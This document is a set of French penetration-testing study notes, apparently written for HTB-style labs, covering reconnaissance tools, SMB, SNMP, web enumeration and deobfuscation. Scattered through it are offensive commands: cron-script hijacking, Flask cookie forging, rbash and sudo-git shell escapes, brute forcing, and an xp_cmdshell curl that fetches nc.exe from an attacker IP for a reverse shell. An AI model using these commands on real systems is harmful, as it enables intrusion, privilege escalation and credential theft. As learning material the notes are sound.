+vérifier si il y a pas des cron qui s'execute en root si oui essayer de copier dans le script une commande pour copier le contenu d'un dossier ou un fichier où on a les droit de lecture/ecriture dans un endroit où on peut lire/écriture
+
+Pour regarder ça la commande serai :
+
+```bash
+crontab -l
+```
+si il y  a pas les droits sur le user il es possible de faire
+
+```bash
+ls -la /var/spool/cron/
+```
+normalement on peut gerer de cette facon au dessus ce qui ce qui dit si il y a une redirections
+
+la commande pour copier ce qu'on veut sera un simple :
+
+```bash
+echo "<fichier ou dossier a copier> <destination>">><fichier.sh>
+```
+
+
+la commande flask-unsign permet de recuperer le secret de l'app flask ce qui permet de forger un cookie de session
+
+Pour l'installer 
+```bash
+pip install flask-unsign --break-system-packages
+```
+
+Pour l'utiliser 
+
+```bash
+flask-unsign --unsign --cookie "<cookie de session" --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval
+```
+
+Pour forger le cookie avec flask-unsign c'es
+
+```bash
+flask-unsign --sign --secret "LA_CLE_TROUVEE" --cookie "<cookie decoder"
+```
+
+Pour savoir que c es l appli Flask 
+1. le cookie commence par eyj
+2. lors d'un nmap si le port 80 es werkzeug c es un serveur WSGI utiliser par Flask
+
+
+Si le bash es un rbash (restriction bash) il faut taper :
+Dans vi:
+- Appuie sur **Échap**
+- Appuie sur **:** (Shift+M)
+- Tape `set shell=/bin/dash`
+- **Entrée**
+- Appuie sur **:**
+- Tape `shell`
+- **Entrée**
+si le prompt passe a $ c es qu'on es bien darsh
+si on veut l'historique et l'autocomplétion la commande sera 
+
+```bash
+/bin/bash
+```
+puis 
+```bash
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+
+
+<mark>Il faut regarder dans les fichiers de configuration il pourrai y avoir des credentials</mark>
+</script>
+<script type="text/plain" class="note-src" data-id="dossier" data-title="Structure d&#x27;un dossier de test" data-cat="method" data-desc="Arborescence d&#x27;engagement, prise de notes et usage du VPN." data-tags="Organisation,VPN" data-cmds="2">
+```
+Projects/
+└── Acme Company
+    ├── EPT
+    │   ├── evidence
+    │   │   ├── credentials
+    │   │   ├── data
+    │   │   └── screenshots
+    │   ├── logs
+    │   ├── scans
+    │   ├── scope
+    │   └── tools
+    └── IPT
+        ├── evidence
+        │   ├── credentials
+        │   ├── data
+        │   └── screenshots
+        ├── logs
+        ├── scans
+        ├── scope
+        └── tools
+```
+exemple de dossier structurer d'un test
+
+Dans cette arborescence ont peut voir le nom de l'entreprise(acme compagny),un dossier EPT (pentest a partir de l exterieur) et IPT (pentest a partir de l interieur) 
+
+exemple de quelque outils pour bien s'organiser:
+cherrytree
+Notion
+sublime text
+evernote ....
+
+##### **Important bien prendre des notes**
+
+Bien utiliser un VPN c es important pour ce connecter et se proteger
+
+l'outils openvpn es pratique si on a un fichier de config VPN
+sinon mulvad es super
+la commande :
+
+```
+netstat -rn 
+```
+cette commande permet de voir les réseau accessible via le VPN
+</script>
+<script type="text/plain" class="note-src" data-id="defs" data-title="Définitions" data-cat="method" data-desc="Vocabulaire de base du pentest." data-tags="Vocabulaire" data-cmds="0">
+misc: des vulns/techniques qui ne rentrent pas dans une catégorie classique (SQLi, XSS, LFI...)
+</script>
+<script type="text/plain" class="note-src" data-id="osint" data-title="OSINT &amp; reconnaissance passive" data-cat="recon" data-desc="crt.sh, Shodan, résolution DNS et lecture des enregistrements." data-tags="crt.sh,Shodan,DNS" data-cmds="8">
+le site crt.sh es un moteur de recherche pour les certificats SSL/TLS enregistré dans les **Certificate Transparency Logs** (CT Logs).
+
+Quand une autorité de certification (CA) émet un certificat SSL pour un domaine, elle est **obligée** (depuis 2018) de l'enregistrer publiquement dans des journaux appelés CT Logs. C'est une mesure de transparence pour détecter les certificats frauduleux.
+
+on peut utiliser la commande 
+
+```shell
+curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq .
+```
+
+on pourrai aussi les filtres par sous-domaine avec la commende :
+
+```shell
+curl -s https://crt.sh/\?q\=<site&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u > subdomainlist
+```
+
+Serveur Héberger par l'Entreprise
+
+```shell
+for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f1,4;done
+```
+une fois que l'on voit qu'elle hôtes peuvent etre examiné on peut générer une liste d'IP avec un ajustement de la commande curl et le passer dans Shodan pour avoir plus de details
+
+Shodan permettra des trouver des IPS connecter en permanence a internet come IdO (internet des Objects)
+
+une fois les IPs trouver on utlisera L'API shodan pour  avoir des infos 
+
+````shell
+for i in $(cat subdomainlist);do host $i | grep "has address" | grep inlanefreight.com | cut -d" " -f4 >> ip-addresses.txt;done
+````
+Cette commande es une boucle for qui traite chaque ligne du fichier
+
+1. **`for i in $(cat subdomainlist)`** → lit chaque ligne du fichier et la met dans la variable `$i`, une à la fois
+2. **`host $i`** → fait une requête DNS sur ce sous-domaine. La commande `host` retourne un truc comme :
+	 (www.inlanefreight.com has address 10.10.10.5)
+3. - **`grep "has address"`** → ne garde que les lignes qui contiennent une résolution IPv4 (élimine les lignes de type "mail is handled by" ou les erreurs)
+4. **`grep inlanefreight.com`** → filtre en plus pour ne garder que les lignes concernant ce domaine précis (utile si `host` retournait aussi d'autres infos parasites)
+5. **`cut -d" " -f4`** → coupe la ligne en utilisant l'espace comme séparateur et prend le **4ème champ**. Dans `www.inlanefreight.com has address 10.10.10.5`, les champs sont 
+- `www.inlanefreight.com` (1)
+- `has` (2)
+- `address` (3)
+- `10.10.10.5` (4) ← c'est ça qu'on récupère
+6. **`>> ip-addresses.txt`** → ajoute (sans écraser) ce résultat à la fin du fichier `ip-addresses.txt`
+
+	Pour interoger Shodan la commande sera:
+
+```shell
+for i in $(cat ip-addresses.txt); do shodan host $i; done
+```
+<mark>faudra faire shodan init <clé API> avant.</mark>
+Pour chaque IP dans le fichier host $1 l'API de shodan es interroger 
+
+La commande:
+
+```shell
+dig any <site>
+```
+
+Dans la sortie de cette commande il pourrai y avoir:
+
+`Enregistrements A`:  lien entre nom de domaine et IP
+`Enregistrements MX`:  indique quel serveur gere les emails du domaine
+`Enregistrements NS`: indique quel serveur DNS gere la resolution du nom de domaine
+`Enregistrements TXT`: un enregistrement DNS qui contient surtout deux types de choses utiles en recon :
+
+- des **codes de vérification** pour prouver que l'entreprise possède bien le domaine (utilisés par des services tiers comme Google, Atlassian, etc.)
+- des **règles de sécurité e-mail** (SPF, DKIM, DMARC) qui définissent quels serveurs sont autorisés à envoyer des mails au nom du domaine — utile pour repérer d'éventuels fournisseurs tiers ou des failles de configuration anti-spoofing
+
+````
+inlanefreight.com.      300     IN      A       10.129.27.33
+````
+Ligne typique:
+
+inlanefreight.com: nom de domaine
+300 : TTL
+IN : classe,ici c es internet 
+A : type d'enregistrement 
+10.129.27.33:valeur (la où pointe inlanefreight.com réellement )
+
+```
+
+```
+</script>
+<script type="text/plain" class="note-src" data-id="outils" data-title="Boîte à outils" data-cat="recon" data-desc="Nmap, Netcat, SMB, SNMP, Gobuster, WPScan, Evil-WinRM, rpcclient…" data-tags="Nmap,SMB,SNMP,WinRM,Impacket" data-cmds="62">
+# Nmap
+
+Dans nmap pour utiliser un script l'option es -sC
+ou
+
+```
+-sV --script=banner
+```
+
+le script --script-trace  permet de voir ce que les scripts envoie et reçois
+
+# NC (netcat)
+
+l'option -nv permet de dire :
+-n pas de resolution DNS
+-v verbose
+
+nc permet aussi d'ecouter le reverseshell comme ça:
+
+```
+nc -nvlp <PORT>
+```
+
+mais nc permet aussi d'envoyer des requetes manuel comme ça:
+```
+nc -nv <IP> <PORT>
+```
+il permet aussi de faire de la banniere grabbing :
+
+```
+nc -nv <IP> <PORT>
+```
+
+il permet aussi d(envoyer des fichier sur la cible : 
+```
+nc -nv <IP> <PORT> < fichier.txt
+```
+ou de recevoir 
+
+```
+nc -nvlp <PORT> > fichier.txt
+```
+
+# FTP
+ c'es un serveur de Fichier 
+la commande pour s'y connecter serai 
+
+```
+ftp -p <IP>
+```
+les commande Bash de base comme ls fonctionne a ça s'ajoute get pour telecharger des fichiers
+
+# SMB 
+
+protocole reseau pour partager les fichiers sur Windows
+certaine version de SMB sont vulnerable au RCE comme etherblue
+pour ce connecter les commandes serai
+
+```
+smbclient -N -L  //<IP>
+```
+-L pour obtenir la liste
+-N pour connecter sans MDP (Null session)(bien le mettre avant toute les options)
+
+l'option -U pour spécifier le user
+
+<img loading="lazy" class="note-img" src="assets/img-20261117140649.png" style="max-width:100%%" alt="Schéma de note">
+
+la commande pour se connecter  a un dossier es :
+
+
+```
+ smbclient //10.129.14.128/notes
+```
+
+la commande  ci dessous permet de lancer des commande en local sans casser la connexion
+```
+!<commande>
+```
+la commande:
+```
+smbstatus
+```
+cette commande permet de voir voir qui,depuis quel hôte et quel partage le client es connecté
+
+# mssqlclient
+
+script de la suite Impacket pour se connecter a un serveur Microsoft MQL server et d'exécuter des requetes SQL directement en ligne de commande
+
+exemple:
+
+```
+mssqlclient.py [domain/]username[:password]@<IP_ou_hostname> [options]
+```
+
+Une fois connecter on peut avoir un reverseshell pour cela il faut utiliser xp_cmdshell qui permet de passer des commande,une fois connecte on peut telecharger  le revershell avec:
+
+```
+EXEC xp_cmdshell 'curl http://<ip serveur où le fichier es /nc.exe -o <chemin où mettre le fichier dans le /temp c es pas mal/nc.exe'
+```
+
+exemple:
+```
+EXEC xp_cmdshell 'curl http://10.10.15.132/nc.exe -o C:\Windows\Temp\nc.exe'
+```
+
+# SNMP
+
+c'es un protocole réseau de supervision et gestion des equipements reseau
+
+l'outils pour ça c es snmpwalk
+exemple:
+```
+snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
+```
+
+`1.3.6.1.2.1.1.1.0`sysDescr — OS, version, architecture`1.3.6.1.2.1.1.5.0`sysName — hostname
+1.3.6.1.2.1.1.6.0`sysLocation — localisation physique`1.3.6.1.2.1.25.4.2.1.2`processus en cours
+1.3.6.1.2.1.25.6.3.1.2`logiciels installés
+1.3.6.1.4.1.77.1.2.25`utilisateurs Windows
+1.3.6.1.2.1.6.13.1.3`ports TCP ouverts
+
+-v 2c : version a utiliser 
+-c public : Community string = "mot de passe" SNMP. "public" est la valeur par défaut laissée par beaucoup d'admins
+
+10.129.42.253: IP de la cible à interroger — doit avoir le port 161 UDP ouvert
+
+1.3.6.1.2.1.1.5.0: OID — adresse précise de l'info voulue. Ici sysName = hostname de la machine
+
+l'outils onesixtyone force les noms de chaine de communauté,le dico es un fichier inclu dans le github
+
+# Gobuster:
+
+enumerateur de site Web
+
+cette outils permet d'effectuer des forçage DNS,vhost,directory
+
+pour forcer les repertoire ou fichier l'option dir es le plus adapter ce qui donne 
+
+```
+gobuster dir -u http://<URL> -w <wordlist>
+```
+
+la wordlist la plus utiliser es comm.txt de Seclist
+-u : défini l'URL
+-w : défini la wordlist
+-x : permet de chercher des extentions
+
+le code 200 signifie que la demande es reussi
+le code 403 signifie que la demande a ete refuser
+le code 301 signifie que la demande a ete redirigé (pas indicateur de defaillance)
+
+```
+gobuster dns -d <Domain> -w <Wordlist>
+```
+la commande permer d'enumerer un des sous domain
+
+# EyeWitness 
+
+cette outil peut etre utiliser fait des screenshots de site web a partir d'une liste d'URL et IPS
+
+```bash
+eyewitness --web -x nmap_output.xml
+```
+
+cette outils peut prendre en charge des scan nmap pour extraire tout les hotes avec des ports typer web ouvert
+
+# Whatweb 
+
+**WhatWeb** est un outil de fingerprinting web — il identifie les **technologies utilisées** par un site.
+
+- Serveur web (Apache, Nginx, IIS...)
+- CMS (WordPress, Joomla, Drupal...)
+- Langages (PHP, Python, Ruby...)
+- Frameworks (jQuery, Bootstrap...)
+- Emails, pays, adresses IP
+- Headers de sécurité
+
+```bash
+whatweb <IP>
+```
+
+commande typique
+
+l'option no-error evite le flood du terminal
+il permet de connaitre la version du site qui permet de faire une comparaison avec les CVE.
+Le paquet exploitdb,avec la commande :
+
+```
+searchsploit <protocole+version>
+```
+
+Cette commande permet de trouver les exploitions possible et les POC possible
+dans le fdossier exploitdb il y a des exploit et dans le fichier de chaque exploit il y a la metodo de comment l utiliser
+
+metasploit es un framework de hack 
+
+Shodan :
+
+c'es un outils scannant internet par exemple les ports ouvert en http/https et tout les protocoles qui peuvent etre exposer
+
+
+```shell
+for i in $(cat subdomainlist);do host $i | grep "has address" | grep <site> | cut -d" " -f4 >> ip-addresses.txt;done
+for i in $(cat ip-addresses.txt);do shodan host $i;done
+```
+
+Ce script fait de la **résolution DNS + enrichissement Shodan** sur une liste de sous-domaines
+
+la commande :
+```
+dig any <site>
+```
+ou 
+```
+dit @8.8.8.8 any <site>
+```
+
+Ces commande retourne :
+`A`IPv4 du domaine
+`AAAA`IPv6
+`MX`Serveurs mail
+`NS`Serveurs DNS autoritaires
+`TXT`Infos texte (SPF, DKIM, vérifications Google/Azure...)
+`CNAME`Alias vers un autre domaine
+`SOA`Infos sur la zone DNS (serveur principal, email admin...)
+`SRV`Services spécifiques (VoIP, XMPP...)
+
+# Feroxbuster
+
+c'es une alternative a gobuster qui fait de la récursive par Default
+Pour enumerer un site web on peut utiliser une worlist pour les  CMS.
+Un CMS es un logiciel pour creer un gerer un site web sans coder comme wordpress
+la commande typique serai:
+
+```bash
+feroxbuster -u http://10.10.10.22 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 100 -C 404,403
+```
+
+-x externsion a test
+-t threads
+-C ignore les statuts code
+
+Code erreur a filtrer le plus souvent:
+
+- **404** → page introuvable (bruit principal)
+- **500** → erreur serveur (pages cassées)
+- **503** → service indispo
+- **400** → mauvaise requête
+- **401** → authentification requise (parfois intéressant à garder)
+- **403** → interdit (souvent intéressant à garder aussi)
+
+Dans Metasploit la commande :
+```bash
+use post/multi/recon/local_exploit_suggester 
+set SESSION <ton_session_id> 
+run
+```
+permet de decouvrir les explit possible sur cette session
+
+
+# Cewl
+
+La commande ci-dessous permet de creer une wordlist a partir des mots sur le site web
+```bash
+cewl http://<url> -d <profondeur> -w <nom du fichier pour la liste >
+```
+
+-d profondeur des mots sur le site 
+
+
+# WPSCAN
+
+pour brute force avec wpscan la commande sera:
+
+```bash
+wpscan --url <url> --username <username potentiel> -P <wordliste personnaliser ou pas >
+```
+
+on peut enumerer avec wpscan la commande sera:
+
+```bash
+wpscan --url <url> --enumerate u
+```
+
+- `u` → énumère les utilisateurs
+- `p` → énumère les plugins
+- `t` → énumère les thèmes
+
+-U pour definir un fichier contenant des Logins
+-P pour definir un fichier contenant des MDP
+
+# Git 
+
+il es possible de détourner git avec l exploit sudo git privilege escalation qui es un GTFOBin il peut etre toruver sur le site 
+
+les étapes de cette exploit 
+
+commande initial:
+
+```bash
+sudo git help config
+```
+
+- Git ouvre une page d'aide avec `less` → less tourne en **root**
+- Dans less tu tapes `!/bin/bash`
+- less exécute `/bin/bash` avec les droits **root**
+- Tu obtiens un shell root
+
+en resumer:
+
+sudo git → less (root) → !/bin/bash → shell root
+
+# FTP
+
+le protocole (file transfere protocol)
+
+l'un de serveur les les connu es vsftpd.
+
+FTPUSERS es un fichier de configuration permettant de configurer les comptes qui ont pas accés au serveur FTP
+
+c'es une mesure de sécurité pour empêcher les comptes avec privilégier ou systeme comme root de se connecter en FTP car le protocole FTP envoie les identifiants en clair   
+
+On peut se connecter en anonyme si c'es pas désactiver avec anonymous:anonymous
+
+l'option --no-passive-ftp permet de dire au serveur que c'es lui ce connecte a toi pas l'inverse mais ce qui a pour inconvhénient que la machine doit etre joignable
+
+ --no-passive-ftp force le mode actif : c'est le serveur qui ouvre la connexion de données vers toi. Utile quand le PASV échoue (le serveur annonce une IP interne/privée dans la réponse PASV), mais attention : en mode actif, c'est ta machine qui doit être joignable par la cible sur le port de données → ça casse souvent derrière un NAT/firewall ou via VPN HTB (tun0). En pentest le passif marche en général mieux ; ne bascule en actif que si le passif bloque.
+
+la commande ls -R permet de voir les dossiers en récursive.
+
+La commande GET permet de telecharger un fichier 
+la commande PUT permet d'envoyer un fichier dans le serveur FTP
+
+
+
+# Joomla
+
+c'es un CMS comme wordpress ou Drupal pour scanner l'utilitaire es :
+
+```bash
+joomscan -u http://<url>
+```
+
+
+# Penelope
+
+c'es un outils qui permet de remplacer nc -lvnp et qui upgrade le shell reçu.**Une fois une session reçue**, Penelope l'upgrade tout seul (TTY interactif, `stty raw -echo` géré automatiquement) — plus besoin de faire le rituel `python3 -c 'import pty...'` + `stty raw -echo` + `export TERM=xterm` à la main.
+
+commande classique lancer le listener:
+
+```bash
+penelope -p 4444
+```
+
+- `sessions` → lister les shells actifs
+- `interact <id>` → basculer sur une session précise
+- upload/download de fichiers directement depuis la session (pas besoin de monter un serveur HTTP à côté)
+- le -p permet de spécifier sur quel port l'outils doit écouter
+```bash
+penelope -p 4444 -i eth0
+penelope -p 4444 --no-upgrade     # désactive l'auto-upgrade si tu veux gérer toi-même
+```
+
+la commande ci dessous permet d'ouvrir un reverse shell qui vient d etre reçu
+
+```
+session <n° de session>
+```
+# legba
+
+bruteforce multiprocole(hydra plus rapide et moderne)
+
+commande general
+```bash
+legba <module> --target <IP:PORT> --username <user_ou_wordlist> --password <wordlist> [options]
+```
+
+
+protocole supporter (en dehors de ça le mieux sera hydra)
+
+```
+ssh, ftp, http, https, smtp, mysql, mssql, postgres,
+rdp, smb, telnet, vnc, kerberos, dns, ldap, imap, pop3, redis...
+```
+
+Pas besoin de mettre les flag -L/-P comme sur hydra ,legba detecte auto se que c es 
+
+# Evil-winrm
+
+Cette outils es utile pour se connecter au service WinRM  qui par default tourne sur le port 5985,nmap l'identifie comme Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+par default la commande es :
+
+```
+evil-wirm -i <ip> -u <username> -p <password>
+```
+
+# Responder
+
+Responder es un outils Windows/AD réseau pour capturer les Hash.
+par exemple si une page charge avec un responder qui ecoute on peut avoir le hash admin ou tout autre
+
+la commande par default es :
+
+```
+responder -I <interface d ecoute>
+```
+
+# Powershell
+
+Dans powershell l'historique de commande es dans 
+
+```
+type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+Type equivalent cat
+
+# Strings
+
+Dans strings on peut faire un tri avec par exemple  -\<nombre de caractere mini>
+
+```
+strings -n 4 memory-dump.raw
+```
+
+strings : la commande
+
+-n \<nombre de caratere mini> : pour afficher un nombre mini de caractere
+
+
+# Grep
+
+Dans grep mon peut mettre :
+
+```
+grep -iE "pid|exe
+```
+
+grep:commande 
+-i : insensible a la casse
+-E : active les expressions régulières étendues (Extended Regex)  
+Ça permet d'utiliser des opérateurs comme `|` (alternative/OU) sans avoir à les échapper avec un backslash. Sans `-E`, il faudrait écrire `grep -i "pid\|exe"` (en regex basique, le `\|` sert d'alternative).
+
+
+# Kiterunner (kr)
+
+`kr` es un scanner de découverte de **endpoints d'API** (fait par Assetnote).
+La différence avec gobuster/ffuf/feroxbuster : il es **"context based"** → au lieu de tester bêtement des mots, il connait de **vraies routes d'API** (collectées depuis des specs Swagger/OpenAPI) avec la **bonne méthode HTTP** (GET/POST/PUT...), les **bons headers** et parfois un **body**. C'es l'outil a sortir quand une cible expose une API (`/api`, `/v1`, endpoints REST) que les fuzzers classiques ratent.
+
+il a 2 modes :
+- **scan** : avec une wordlist intelligente `.kite` (routes + méthode) → pour les API
+- **brute** : avec une wordlist texte classique (comme gobuster) → forçage bête de chemins
+
+## scan (mode API)
+
+commande de base :
+
+```bash
+kr scan <cible> -w routes-large.kite
+```
+
+la cible peut etre une URL (`https://10.129.42.191:8443/api`), un domaine, ou un **fichier de hôtes** (un par ligne).
+
+commande typique complète :
+
+```bash
+kr scan https://10.129.42.191/ -w routes-large.kite -x 10 -j 1 --ignore-length=34 --fail-status-codes 400,401,403,404,500,501,502
+```
+
+Options les plus utiles :
+
+- `-w` : wordlist `.kite` a utiliser (répétable)
+- `-A` : wordlist hébergée par Assetnote, téléchargée toute seule, avec un cap sur la taille. exemple : `-A=apiroutes-210328:20000` (les 20000 premières routes). `kr wordlist list` affiche les noms dispo.
+- `-x` : nombre de connexions par hôte (défaut 3). Mettre **5 à 10** pour aller vite sans DoS la cible.
+- `-j` : nombre d'hôtes scannés en parallèle (défaut 50). Sur **une seule** cible mettre `-j 1`.
+- `-H` : ajouter un header. exemple pour une API avec token : `-H "Authorization: Bearer <token>"`
+- `-d` : profondeur de preflight (défaut 1). Au dela de 1 c'es déconseillé.
+- `-t` : timeout par requête (défaut 3s), `--delay` : délai entre requêtes.
+- `-o` : format de sortie → `pretty` (défaut), `text` ou `json`.
+
+## Filtrer le bruit
+
+Deux façons (comme le -C de feroxbuster mais pour API) :
+
+- `--fail-status-codes 400,401,403,404,...` : **blacklist** de codes a cacher (le plus courant)
+- `--success-status-codes 200,...` : **whitelist**, n'affiche que ceux la
+- `--ignore-length=34` ou `--ignore-length=100-105,1234` : cacher les réponses d'une **taille** donnée (utile quand la cible renvoie toujours la meme page d'erreur avec un 200)
+
+## brute (mode classique)
+
+Comme gobuster mais pour API, avec une wordlist **texte** :
+
+```bash
+kr brute https://10.129.42.191/ -w wordlist.txt -x 10 -d 0 -e json,txt -D
+```
+
+- `-w` : wordlist `.txt` classique
+- `-e` : extensions a tester (`-e json,txt`)
+- `-D` : mode compatible dirsearch (remplace le `%EXT%` de la wordlist)
+- `-d 0` : profondeur 0 (racine seulement, défaut en mode brute)
+
+## Les wordlists (.kite)
+
+Les `.kite` sont des wordlists **compilées** (routes + méthode HTTP + headers + body). **Elles ne sont PAS dans SecLists** → c'es le format maison d'Assetnote, a télécharger une fois :
+
+```bash
+# grosse (183 Mo décompressée, la plus complète)
+wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-large.kite.tar.gz
+# petite (35 Mo, plus rapide)
+wget https://wordlists-cdn.assetnote.io/data/kiterunner/routes-small.kite.tar.gz
+tar xvf routes-large.kite.tar.gz
+```
+
+### ⭐ Déjà installées en permanence sur mon Exegol
+Les vrais fichiers vivent dans **`my-resources`** (dossier monté dans TOUS les conteneurs Exegol, présents et futurs), et un **lien** les expose dans le chemin standard des wordlists. Dispo dans n'importe quel nouvel Exegol, sans rien retélécharger :
+
+```bash
+/usr/share/wordlists/kiterunner/routes-large.kite   # <- chemin standard (lien)
+/usr/share/wordlists/kiterunner/routes-small.kite
+# vrais fichiers : /opt/my-resources/wordlists/kiterunner/*.kite
+```
+
+usage direct :
+
+```bash
+kr scan https://cible/ -w /usr/share/wordlists/kiterunner/routes-large.kite -x 10 -j 1
+```
+
+> Comment c'es rendu permanent : `/usr/share/wordlists` n'es PAS persistant (dans l'image). Donc le lien es recréé a chaque démarrage par `/opt/my-resources/setup/load_user_setup.sh` (ligne `ln -sfn /opt/my-resources/wordlists/kiterunner /usr/share/wordlists/kiterunner`). Côté hôte, tout vit dans `/root/.exegol/my-resources/`.
+
+### SecLists vs .kite (ne pas confondre)
+- **`.kite`** = requêtes complètes (route + méthode) → mode **`kr scan`**. Pas dans SecLists.
+- **SecLists** `/opt/lists/seclists/Discovery/Web-Content/api/*.txt` (`api-endpoints.txt`, `api-seen-in-wild.txt`...) = juste des **noms** de chemins → mode **`kr brute`** (ou ffuf/gobuster/feroxbuster).
+
+On peut aussi se **fabriquer sa propre** `.kite` a partir d'une spec Swagger/OpenAPI de la cible (fichier JSON) ou d'une wordlist SecLists :
+
+```bash
+kr kb convert swagger.json custom.kite     # txt/json <-> kite
+kr kb compile routes.json routes.kite      # dataset json -> kite
+```
+
+## Rejouer une requête (kb replay)
+
+Quand `scan` trouve un endpoint intéressant, la ligne de résultat peut etre **rejouée** pour voir la requête/réponse complète (et la passer dans Burp) :
+
+```bash
+kr kb replay -q --proxy=http://localhost:8080 -w routes-large.kite "POST 403 [287,10,1] https://cible/api/v1/... <hash>"
+```
+
+- il faut **la meme wordlist `-w`** qu'au scan (il reconstruit la requête depuis la route)
+- `--proxy` : envoyer la requête dans Burp pour l'analyser/modifier
+
+## A retenir
+
+surface d'attaque → exploitation :
+1. Un fuzzer classique (feroxbuster/gobuster) trouve `/api` mais rien dedans → sortir `kr`.
+2. `kr scan` avec `routes-large.kite` → découvre les vraies routes (bonne méthode HTTP).
+3. Filtrer avec `--fail-status-codes` / `--ignore-length` pour isoler les `200`.
+4. `kr kb replay` + `--proxy` → envoyer l'endroit trouvé dans Burp pour exploiter.
+
+
+##  GIT 
+
+
+si sur un page il y a des fichier git quand on a enumerer les pages on peut utiliser git-dumper , c'es un outils en python qui permet de reconstituer un repo git exposer sur internet si on n'a pas de shell ni de git clone possible
+exemple :
+
+```
+git-dumper [options] URL DOSSIER_SORTIE
+```
+
+exemple concret (dossier .git exposé trouvé au feroxbuster) :
+
+```bash
+git-dumper http://10.130.173.76:8080/.git/ ./dump
+```
+
+Options utiles :
+
+| Option | Rôle |
+|---|---|
+| `-j 10` | nombre de threads (parallélise les téléchargements) |
+| `-r 3` | retries par requête |
+| `-H 'Header: val'` | ajouter un header (ex. cookie d'auth, User-Agent) |
+| `--proxy http://127.0.0.1:8080` | passer par Burp pour observer |
+| `-u 'User-Agent...'` | changer le User-Agent |
+
+une fois dumpé, l'or es dans l'historique (pas juste le working tree) :
+
+```bash
+cd dump
+git log --oneline --all          # tout l'historique, toutes les branches
+git log -p --all | grep -Ei 'password|secret|api[_-]?key|token|flag'
+git show <commit>:chemin/fichier  # restaurer un fichier supprimé
+```
+
+
+## Offuscation
+
+Cette technique permet de rendre plus dure a lire un script par un Humain toute en laissant le script lisible par la machine .
+
+le site qui permettrai de faire ça pour tester serai https://beautifytools.com/javascript-obfuscator.php meme si il existe des outils pour le faire en automatique.Pour vérifier si le code rempli tjr son office on peut verifier avec le site : https://jsconsole.com/
+
+par exemple ce code es un type d'offuscation packing en reference au nom de la fonction function(p,a,c,k,e,d)
+```
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('5.4(\'3 2 1 0\');',6,6,'Module|Deobfuscation|JavaScript|HTB|log|console'.split('|'),0,{}))
+```
+
+Un outils d'offuscation de type packed tente généralement de converstir tout les mots et symboles du code en une liste ou un dictionnaire, puis de s'y référer en utilisant la fonction `(p,a,c,k,e,d)` pour reconstruire le code original lors de l'exécution
+
+Nous voyons que le code actuel que nous avons est entièrement écrit sur une seule ligne. C'est ce que l'on appelle du code `Minified JavaScript`
+
+Par exemple, si nous utilisions Firefox, nous pouvons ouvrir le débogueur du navigateur avec `CTRL+SHIFT+Z`, puis cliquer sur notre script `secret.js`. Cela affichera le script dans son format d'origine, mais nous pouvons cliquer sur le bouton « `{ }` » en bas, qui va `Pretty Print`
+
+
+De plus, nous pouvons utiliser de nombreux outils en ligne ou plugins d'éditeurs de code, comme [Prettier](https://prettier.io/playground/) ou [Beautifier](https://beautifier.io/).
+
+<mark>🔴L'outils UnPacker es un bonne outils pour Désobfusquer(https://matthewfl.com/unPacker.html)</mark>
+
+
+## Openssl
+
+
+`openssl` est une boîte à outils cryptographique. En pentest, son sous-outil `s_client` sert de **client TLS/SSL générique** : il ouvre une connexion chiffrée vers un service et affiche le **certificat** présenté + permet de **dialoguer en clair** avec le service par-dessus le tunnel.
+
+```bash
+openssl s_client -connect 10.129.14.136:21 -starttls ftp
+```
+
+Décryptage de la commande :
+
+| Partie | Rôle |
+| --- | --- |
+| `s_client` | lance le client TLS générique d'OpenSSL |
+| `-connect 10.129.14.136:21` | adresse `IP:port` de la cible (ici le FTP, port 21) |
+| `-starttls ftp` | ne se connecte PAS directement en TLS : établit d'abord une session FTP **en clair**, puis envoie la commande `AUTH TLS` pour **basculer** la connexion existante en chiffré (`STARTTLS`) |
+
+Pourquoi `-starttls` : certains services (FTP, SMTP, IMAP, POP3, LDAP...) démarrent en **clair** sur leur port normal, puis **passent au chiffré à la demande** via une commande (`AUTH TLS` pour le FTP). On ne peut donc pas faire un simple TLS direct dessus ; il faut qu'OpenSSL joue la négociation `STARTTLS` à notre place. Les valeurs possibles suivent le protocole : `-starttls ftp`, `smtp`, `imap`, `pop3`, `ldap`...
+
+### Intérêt en pentest
+
+**1. Récupérer le certificat → nouvelles infos sur la cible**
+
+Dès la connexion, OpenSSL affiche le certificat du service. C'est une mine d'or pour l'énumération :
+
+```
+subject=CN = ftp.internal.htb
+issuer=CN = CORP-CA, O = Megacorp Ltd, emailAddress=admin@megacorp.htb
+X509v3 Subject Alternative Name:
+    DNS:ftp.internal.htb, DNS:backup.megacorp.htb
+```
+
+→ On récupère des **noms d'hôtes / domaines internes** (`internal.htb`, `backup.megacorp.htb`), un **nom d'organisation**, parfois des **e-mails** (utiles pour deviner des logins). Réflexe : ajouter ces noms dans `/etc/hosts` et relancer l'énumération dessus (vhosts, nouveaux services).
+
+**2. Confirmer le chiffrement (FTPS) et tester la config TLS**
+
+- Si `AUTH TLS` réussit → le FTP supporte le **FTPS explicite**. Bon à savoir avant de s'acharner en clair.
+- OpenSSL montre la **version TLS** et le **chiffre** négociés → on repère une **crypto faible/obsolète** (SSLv3, TLS 1.0, RC4, certificat auto-signé ou **expiré**) = un **finding** à noter dans le rapport.
+
+**3. Interagir avec le service dans le tunnel chiffré**
+
+Une fois `STARTTLS` fait, la session reste ouverte : on peut **taper les commandes FTP à la main** (`USER`, `PASS`, `SYST`, `FEAT`...) comme avec `nc`, **mais chiffré**. Indispensable quand le service **refuse l'authentification en clair** (certains FTP n'autorisent le login que sur canal TLS). Sans OpenSSL, impossible de s'authentifier.
+
+**4. Débloquer un service qui impose le TLS**
+
